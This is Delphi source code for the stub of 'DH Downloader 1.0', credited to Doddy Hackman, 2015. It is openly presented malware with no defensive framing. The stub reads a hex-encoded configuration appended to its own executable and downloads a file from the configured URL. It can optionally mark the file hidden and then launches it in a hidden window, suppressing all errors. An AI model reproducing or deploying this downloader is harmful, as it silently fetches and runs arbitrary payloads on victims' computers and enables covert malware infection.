// DH Downloader 1.0
// (C) Doddy Hackman 2015

// Stub

program stub_down;

{$APPTYPE GUI}

uses
  SysUtils, Windows, URLMon, ShellApi;

// Functions

procedure cargar_archivo(archivo: TFileName; tipo: string);
var
  data: SHELLEXECUTEINFO;
begin
  if (FileExists(archivo)) then
  begin
    ZeroMemory(@data, SizeOf(SHELLEXECUTEINFO));
    data.cbSize := SizeOf(SHELLEXECUTEINFO);
    data.fMask := SEE_MASK_NOCLOSEPROCESS;
    data.Wnd := 0;
    data.lpVerb := 'open';
    data.lpFile := PChar(archivo);
    if (tipo = 'Show') then
    begin
      data.nShow := SW_SHOWNORMAL;
    end;
    if (tipo = 'Hide') then
    begin
      data.nShow := SW_HIDE;
    end;
    if not ShellExecuteEx(@data) then
      if GetLastError <= 32 then
      begin
        SysErrorMessage(GetLastError);
      end;
  end;
end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

var
  ob: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  link: string;
  todo: string;
  opcion: string;
  path: string;
  nombre: string;
  rutafinal: string;
  tipodecarga: string;

begin

  try

    ob := INVALID_HANDLE_VALUE;
    code := '';

    ob := CreateFile(PChar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ, nil,
      OPEN_EXISTING, 0, 0);
    if (ob <> INVALID_HANDLE_VALUE) then
    begin
      SetFilePointer(ob, -9999, nil, FILE_END);
      ReadFile(ob, code, 9999, nose, nil);
      CloseHandle(ob);
    end;

    todo := regex(code, '[63686175]', '[63686175]');
    todo := dhencode(todo, 'decode');

    if not(todo = '') then
    begin
      link := regex(todo, '[link]', '[link]');
      opcion := regex(todo, '[opcion]', '[opcion]');
      path := regex(todo, '[path]', '[path]');
      nombre := regex(todo, '[name]', '[name]');
      tipodecarga := regex(todo, '[carga]', '[carga]');

      rutafinal := GetEnvironmentVariable(path) + '/' + nombre;

      // Writeln('[+] Online');

      try

        begin
          UrlDownloadToFile(nil, PChar(link), PChar(rutafinal), 0, nil);

          if (FileExists(rutafinal)) then
          begin

            if (opcion = '1') then
            begin
              SetFileAttributes(PChar(rutafinal), FILE_ATTRIBUTE_HIDDEN);
            end;

            if (tipodecarga = '1') then
            begin
              cargar_archivo(rutafinal, 'Hide');
            end
            else
            begin
              cargar_archivo(rutafinal, 'Show');
            end;
          end;

        end;
      except
        //
      end;
    end
    else
    begin
      // Writeln('[-] Offline');
    end;
  except
    //
  end;

end.

// The End ?
